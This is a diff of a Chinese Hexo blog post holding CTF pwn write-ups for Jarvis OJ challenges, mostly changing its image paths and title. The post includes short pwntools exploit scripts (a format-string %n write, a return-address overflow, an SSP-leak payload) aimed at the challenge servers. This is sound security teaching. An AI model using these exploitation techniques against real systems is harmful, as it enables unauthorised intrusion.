@@ -89,61 +89,61 @@
 
 <meta name="description" content="1.xwork 运行、查保护  是64位文件； 只有NX开启，说明我们无法执行shellcode，可使用ROP进行绕过； 将文件拖入ida64观察： ———————————————————————待续——————————————————————————- 2.fm 运行、查保护  无法修改GOT表、地址随机化、无法执行shellcode 拖进ida，通过尝试执行知道x一直为3，但只有x==4时才能">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Jarvis OJ-pwn">
-<meta property="og:url" content="http://yoursite.com/2018/11/26/Jarvis-OJ-pwn/index.html">
+<meta property="og:title" content="Jarvis OJ Pwn">
+<meta property="og:url" content="http://yoursite.com/2018/11/26/Jarvis OJ pwn/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="1.xwork 运行、查保护  是64位文件； 只有NX开启，说明我们无法执行shellcode，可使用ROP进行绕过； 将文件拖入ida64观察： ———————————————————————待续——————————————————————————- 2.fm 运行、查保护  无法修改GOT表、地址随机化、无法执行shellcode 拖进ida，通过尝试执行知道x一直为3，但只有x==4时才能">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/1.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/fm1.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/fm2.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/fm3.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/fm4.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/tell_me_something.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/tell3.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/1.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/fm1.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/fm2.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/fm3.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/fm4.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/tell_me_something.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/tell3.png">
 <meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/tell2.png">
 <meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/tell4.png">
 <meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/tell5.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/sma.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/sma2.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/sma3.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/sma4.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/sma.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/sma2.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/sma3.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/sma4.png">
 <meta property="og:image" content="http://img2.tan90.me/jarvis_wp_a768142147ca3976598941b5c6c67161.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/sma5.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/sma6.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/smas7.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/Bac1.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/bac2.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/bac3.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/bac6.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/bac5.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gu1.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus2.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus3.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus4.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus6.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus7.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus8.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus9.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus11.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus12.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus13.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus10.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus14.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus15.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus16.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/故事6.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus17.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gus18.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gue1.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gue2.png">
-<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/gue3.png">
-<meta property="og:updated_time" content="2019-03-21T13:04:18.325Z">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/sma5.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/sma6.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/smas7.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/Bac1.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/bac2.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/bac3.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/bac6.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/bac5.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gu1.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus2.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus3.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus4.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus6.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus7.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus8.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus9.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus11.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus12.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus13.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus10.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus14.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus15.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus16.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/故事6.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus17.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gus18.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gue1.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gue2.png">
+<meta property="og:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/gue3.png">
+<meta property="og:updated_time" content="2019-03-21T13:18:26.009Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Jarvis OJ-pwn">
+<meta name="twitter:title" content="Jarvis OJ Pwn">
 <meta name="twitter:description" content="1.xwork 运行、查保护  是64位文件； 只有NX开启，说明我们无法执行shellcode，可使用ROP进行绕过； 将文件拖入ida64观察： ———————————————————————待续——————————————————————————- 2.fm 运行、查保护  无法修改GOT表、地址随机化、无法执行shellcode 拖进ida，通过尝试执行知道x一直为3，但只有x==4时才能">
-<meta name="twitter:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ/1.png">
+<meta name="twitter:image" content="d:/bolg/hexo/source/_posts/Jarvis%20OJ%20pwn/1.png">
 
 
 
@@ -171,13 +171,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/11/26/Jarvis-OJ-pwn/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/11/26/Jarvis OJ pwn/"/>
 
 
 
 
 
-  <title> Jarvis OJ-pwn | Hexo </title>
+  <title> Jarvis OJ Pwn | Hexo </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -296,7 +296,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/Jarvis-OJ-pwn/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/26/Jarvis OJ pwn/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -317,7 +317,7 @@
             
             
               
-                Jarvis OJ-pwn
+                Jarvis OJ Pwn
               
             
           </h1>
@@ -370,46 +370,46 @@
       
         <p><strong>1.xwork</strong></p>
 <p>运行、查保护</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\1.png" alt=""></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\1.png" alt=""></p>
 <p>是64位文件；</p>
 <p>只有NX开启，说明我们无法执行shellcode，可使用ROP进行绕过；</p>
 <p>将文件拖入ida64观察：</p>
 <p>———————————————————————待续——————————————————————————-</p>
 <p><strong>2.fm</strong></p>
 <p>运行、查保护</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\fm1.png" alt=""></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\fm1.png" alt=""></p>
 <p>无法修改GOT表、地址随机化、无法执行shellcode</p>
 <p>拖进ida，通过尝试执行知道x一直为3，但只有x==4时才能拿到shell</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\fm2.png" alt=""></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\fm2.png" alt=""></p>
 <p>很明显的格式化字符串漏洞：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\fm3.png" alt=""></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\fm3.png" alt=""></p>
 <p>利用格式化字符串漏洞的任意地址读写， “x_addr%[i]$n”，%n可以将已经输出的字符个数写入到指定的参数中，这个格式化字符串会在栈上的某处，需要定位x_addr作为printf的第几个参数来确定[i]的值，由于x_addr在32位程序中刚好是4个字节，所以这个格式化字符串刚好能把相应参数变为4 </p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\fm4.png" alt=""></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\fm4.png" alt=""></p>
 <p>gdb确定x_addr位置并验证一下（p是小写）</p>
 <p>exp如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=remote(&quot;pwn2.jarvisoj.com&quot;,9895)</span><br><span class="line">x_addr=0x804A02C</span><br><span class="line">payload=p32(x_addr)+&quot;%11$n&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>3.Tell Me Something</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\tell_me_something.png" alt=""></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\tell_me_something.png" alt=""></p>
 <p>NX开启，说明我们无法执行shellcode，可使用ROP进行绕过；</p>
 <p>简单栈溢出，在good_game函数里读取了“flag.txt”,read()函数读取数据无限制，只要控制其覆盖返回地址，返回至good_game即可</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\tell3.png" alt=""></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\tell3.png" alt=""></p>
 <p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\tell2.png" alt=""></p>
 <p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\tell4.png" alt=""></p>
 <p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\tell5.png" alt=""></p>
 <p>exp如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> 1 from pwn import *</span><br><span class="line"> 2 </span><br><span class="line"> 3 p=remote(&quot;pwn.jarvisoj.com&quot;,9876)</span><br><span class="line"> 4 </span><br><span class="line"> 5 good_game=0x400620</span><br><span class="line"> 6 </span><br><span class="line"> 7 p.recv()</span><br><span class="line"> 8 </span><br><span class="line"> 9 payload=&apos;a&apos;*0x88+p64(good_game)</span><br><span class="line">10 </span><br><span class="line">11 p.sendline(payload)</span><br><span class="line">12 </span><br><span class="line">13 p.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>4.Smashes</strong>  </p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\sma.png" alt=""></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\sma2.png" alt="1543476254578"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\sma.png" alt=""></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\sma2.png" alt="1543476254578"></p>
 <p>首先，函数使用了gets()来获取输入，好处是我们可以输入无限长度的字符串，坏处是发送过去的字符串的尾部会以<code>\n</code>结尾，所以无法绕过canary。</p>
 <p>纵观整个程序，似乎没有什么地方能够绕过canary，也没有什么地方能打印flag。</p>
 <p>但如果你换个思路，我们故意触发canary的保护会怎么样？</p>
 <p>事实上，就有一种攻击方法叫做<strong>SSP（Stack Smashing Protector ）leak</strong>。</p>
 <p>现在我们来稍微梳理一下程序结构：</p>
 <p>当我们像一开始那样正常输入，程序会正常执行退出，但如果输入过量字符串就会触发canary，如图：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\sma3.png" alt="1543477591581"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\sma3.png" alt="1543477591581"></p>
 <p>回到ida：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\sma4.png" alt="1543477660827"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\sma4.png" alt="1543477660827"></p>
 <p>可以很明显的观察到，其调用了_stack_chk_fail函数：</p>
 <p>我们来看一下该函数源码：<br><strong>__stack_chk_fail :</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void </span><br><span class="line">__attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (void) &#123;   </span><br><span class="line">    __fortify_fail (&quot;stack smashing detected&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -422,20 +422,20 @@
 <p>vc++6.0会给你默认的启动参数，所以main函数的那两个参数是不用输入的，但每当调用默认启动函数中提供的函数时，都要调用第二个参数，所以说覆盖argv[0],即使有栈保护，也可以输出我们想要的；</p>
 <p>gets()函数不检查字符串长短，通过覆盖到argv[0]，就可以构造ssp leak达到任意地址读 ；</p>
 <p>接着我们找存放flag的地址，在ida中发现如下语句：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\sma5.png" alt="1543478666561"></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\sma6.png" alt="1543478694252"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\sma5.png" alt="1543478666561"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\sma6.png" alt="1543478694252"></p>
 <p> 然而，正真的flag并非存在这个地址，而是发生了ELF的的重映射，正真的地址如下：</p>
 <p>（start后find）</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\smas7.png" alt="1543479529340"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\smas7.png" alt="1543479529340"></p>
 <p>可见，在0x400d20处存在flag的备份。 </p>
 <p>exp：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> 1 from pwn import *</span><br><span class="line"> 2 </span><br><span class="line"> 3 p=remote(&apos;pwn.jarvisoj.com&apos;,9877)</span><br><span class="line"> 4 </span><br><span class="line"> 5 p.recv()</span><br><span class="line"> 6 </span><br><span class="line"> 7 payload=p64(0x400d21)*200</span><br><span class="line"> 8 p.sendline(payload)</span><br><span class="line"> 9 </span><br><span class="line">10 p.interactive()</span><br></pre></td></tr></table></figure>
 <p>5.Backdoor（逆向pwn）</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\Bac1.png" alt="1543481859895"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\Bac1.png" alt="1543481859895"></p>
 <p>先梳理一下程序：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WideCharToMultiByte(1u, 0, (LPCWSTR )(a2 + 4), -1, lpMultiByteStr, cbMultiByte, 0, 0);</span><br></pre></td></tr></table></figure>
 <p>将命令行第二个参数a2传了进来；</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\bac2.png" alt="1543482089774"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\bac2.png" alt="1543482089774"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lpMultiByteStr = (LPSTR)sub_4011F0(cbMultiByte);</span><br></pre></td></tr></table></figure>
 <p>命令行第一个参数a1给了lpMultiByteStr；</p>
 <p>接着出现了v13</p>
@@ -447,57 +447,57 @@
 <p>然后将v13数目的‘A’填充进Dest里面</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)Source = 0x7FFA4512;</span><br></pre></td></tr></table></figure>
 <p><strong>0x7FFA4512</strong>是windows 上一个万能的 jmp esp<br>通过参数控制这个 jmp esp 溢出到某一个函数的返回地址，从而改变程序的控制流去执行此时 esp 上地址的内容</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\bac3.png" alt="1543482829056"></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\bac6.png" alt="1543482884033"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\bac3.png" alt="1543482829056"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\bac6.png" alt="1543482884033"></p>
 <p>所以我们可以通过Dest来实现溢出：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\bac5.png" alt="1543483022078"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\bac5.png" alt="1543483022078"></p>
 <p>需要0x20个字节+4个字节的返回地址也就是说输入的命令行参数处理过之后是0x24字节。这里v13 ^= 0x6443u;处理过一次，所以输入的命令行参数就是chr(0x24^0x43),chr(0x00^0x64)。 </p>
 <p>exp：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 import hashlib</span><br><span class="line">2 flag=&quot;&quot;</span><br><span class="line">3 flag+=chr(0x24^0x43)</span><br><span class="line">4 flag+=chr(0x00^0x64)</span><br><span class="line">5 </span><br><span class="line">6 print hashlib.sha256(flag).hexdigest()</span><br></pre></td></tr></table></figure>
 <p>hash加密：<strong>import hashlib</strong> </p>
 <p><strong>hashlib.sha256(string).hexdigest()</strong> </p>
 <p>6.Guess</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gu1.png" alt="1543483900963"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gu1.png" alt="1543483900963"></p>
 <p>通过运行似乎还看不出来是什么鬼东西，只开了NX</p>
 <p>还是拖进ida看看：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus2.png" alt="1543500803357"></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus3.png" alt="1543500836193"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus2.png" alt="1543500803357"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus3.png" alt="1543500836193"></p>
 <p>这是一个标准的 socket 服务器模型 , 使用 fork() 而不是多线程来处理客户端请求 </p>
 <p>使用 fork() 来处理客户端请求和使用多线程对我们之后进行动态调试会有影响  因为 fork() 函数会在操作系统中产生一个新的进程 ,  这样使用 ida 进行远程 attach 的时候就要找到子进程进行调试  因为业务逻辑的处理都在子进程里面 , 这里使用 handle 函数  </p>
 <p>继续寻找漏洞点，</p>
 <p>可以看到输入是用fget函数处理的，限制了输入的长度，所以不好溢出。</p>
 <p>*在 handle 函数中 , 存在一个计时器函数 , 这会影响我们对程序进行动态跟踪 , 这里我们对其的处理是将其 nop 掉 , 使用 ida 的具体流程 ：</p>
 <p><strong>Menu-&gt;Options-&gt;General</strong> </p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus4.png" alt="1543501415691"></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus.png" alt="1543501525408"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus4.png" alt="1543501415691"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus.png" alt="1543501525408"></p>
 <p><strong>Edit–&gt;Patch program-&gt;Change byte…</strong></p>
 <p>做如下更改：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus6.png" alt="1543501718438"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus6.png" alt="1543501718438"></p>
 <p>变更后如下：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus7.png" alt="1543501885298"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus7.png" alt="1543501885298"></p>
 <p>Edit-&gt;Patch program-&gt;Apply patches to input file..</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus8.png" alt="1543502047870"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus8.png" alt="1543502047870"></p>
 <p>这样就完成了一次 patch(补丁) , 然后重新将程序载入 ida , 可以看到 alarm 函数已经被 patch 掉了 （操作结束后，记得重新F5）</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus9.png" alt="1543502219774"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus9.png" alt="1543502219774"></p>
 <p>现在我们来尝试一下动态调试：</p>
 <p>首先依旧是运行一下程序：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus11.png" alt="1543541160256"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus11.png" alt="1543541160256"></p>
 <p>通过 pidof 命令来找到正在运行的 服务器程序 的 pid 号 , 可以用于区分子进程与父进程 ：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus12.png" alt="1543541250281"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus12.png" alt="1543541250281"></p>
 <p>当我们使用 nc 连接到本地的 9999 端口的时候 , 再执行 pidof 就可以发现存在新的进程 而这个进行就是用于处理客户端请求的子进程 ：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus13.png" alt="1543542688343"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus13.png" alt="1543542688343"></p>
 <p>ida调试在Debugger选项—未完待续—</p>
 <p>接着看看flag_correct( )函数 ，发现 flag 字符串：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus10.png" alt="1543502494799"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus10.png" alt="1543502494799"></p>
 <p>分析一下is_flag_correct函数：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(bin_by_hex, &amp;unk_401100, sizeof(bin_by_hex));</span><br></pre></td></tr></table></figure>
 <p>将程序中的 0x401100 的位置的数据复制到栈上 bin_by_hex  </p>
 <p>查看一下0x401100地址的数据：</p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus14.png" alt="1543543376808"></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus15.png" alt="1543543464986"></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus16.png" alt="1543543502593"></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\故事6.png" alt="1543543536385"></p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus17.png" alt="1543543573657"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus14.png" alt="1543543376808"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus15.png" alt="1543543464986"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus16.png" alt="1543543502593"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\故事6.png" alt="1543543536385"></p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus17.png" alt="1543543573657"></p>
 <p>可以发现 , 这里总共有 256 字节 , 除了 ASCII 码 0-9 以及大小写 ABCDEF 以外全部都是 0xFF </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qmemcpy(flag, &quot;FAKE&#123;9b355e394d2070ebd0df195d8b234509cc29272bc412&#125;&quot;, sizeof(flag));</span><br></pre></td></tr></table></figure>
 <p>flag样字符串保存在栈上的 , 长度 50 字节  </p>
@@ -509,7 +509,7 @@
 <p>这个循环做的事情就是将用户输入的 16 进制字符串转换为真正的字符串并保存在 given_flag 中</p>
 <p>然后再对 given_flag 和 flag(真正的 flag) 进行比较 , 根据比较的结果再返回</p>
 <p>注意到栈的布局：  </p>
-<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ\gus18.png" alt="1543544718867"> </p>
+<p><img src="D:\bolg\hexo\source\_posts\Jarvis OJ pwn\gus18.png" alt="1543544718867"> </p>
